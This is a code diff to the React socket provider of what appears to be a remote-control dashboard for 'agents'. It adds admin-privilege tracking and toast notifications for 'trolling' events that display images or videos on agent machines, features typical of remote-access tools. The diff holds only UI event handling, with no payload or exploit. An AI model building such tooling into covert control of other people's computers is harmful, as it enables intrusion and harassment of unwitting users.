@@ -17,6 +17,7 @@ interface Agent {
     memory: number;
     network: number;
   };
+  is_admin?: boolean;
 }
 
 interface Notification {
@@ -466,13 +467,40 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
               cpu: coerceFiniteNumber(data?.cpu_usage ?? data?.performance?.cpu, 0),
               memory: coerceFiniteNumber(data?.memory_usage ?? data?.performance?.memory, 0),
               network: coerceFiniteNumber(data?.network_usage ?? data?.performance?.network, 0)
-            }
+            },
+            is_admin: data.is_admin
           };
         });
         console.log('Processed agent list:', agentList);
         setAgents(agentList);
       } catch (error) {
         console.error('Error processing agent list update:', error);
+      }
+    });
+
+    // Handle real-time privilege updates
+    socketInstance.on('agent_privilege_update', (data: { agent_id: string; is_admin: boolean; timestamp: number }) => {
+      try {
+        console.log('🔍 SocketProvider: Received agent_privilege_update:', data);
+        const { agent_id, is_admin, timestamp } = data;
+        
+        setAgents(prevAgents => 
+          prevAgents.map(agent => 
+            agent.id === agent_id 
+              ? { ...agent, is_admin }
+              : agent
+          )
+        );
+        
+        // Show notification about privilege change
+        const privilegeText = is_admin ? 'Administrator' : 'Standard user';
+        toast.info(`Agent privilege updated: ${agent_id} is now ${privilegeText}`);
+        
+        // Add to activity log
+        addCommandOutput(`Privilege update: Agent ${agent_id} changed to ${privilegeText}`);
+        
+      } catch (error) {
+        console.error('Error processing agent privilege update:', error);
       }
     });
 
@@ -601,6 +629,37 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
         setNotifications(prev => [...prev.slice(-99), n]);
       } catch (e) {
         console.error('Error processing agent_notification:', e, data);
+      }
+    });
+
+    // Trolling events - show slide notifications when agent starts trolling
+    socketInstance.on('troll_show_image', (data: any) => {
+      try {
+        const agentId = data?.agent_id || 'Unknown Agent';
+        const filename = data?.filename || 'image';
+        toast.info(`🎭 Trolling started!`, {
+          description: `${agentId} is displaying ${filename}`,
+          duration: 4000,
+          position: 'top-right',
+        });
+        console.log(`🎭 Trolling image started from agent: ${agentId}, file: ${filename}`);
+      } catch (e) {
+        console.error('Error processing troll_show_image event:', e, data);
+      }
+    });
+
+    socketInstance.on('troll_show_video', (data: any) => {
+      try {
+        const agentId = data?.agent_id || 'Unknown Agent';
+        const filename = data?.filename || 'video';
+        toast.info(`🎭 Trolling started!`, {
+          description: `${agentId} is playing ${filename}`,
+          duration: 4000,
+          position: 'top-right',
+        });
+        console.log(`🎭 Trolling video started from agent: ${agentId}, file: ${filename}`);
+      } catch (e) {
+        console.error('Error processing troll_show_video event:', e, data);
       }
     });
 
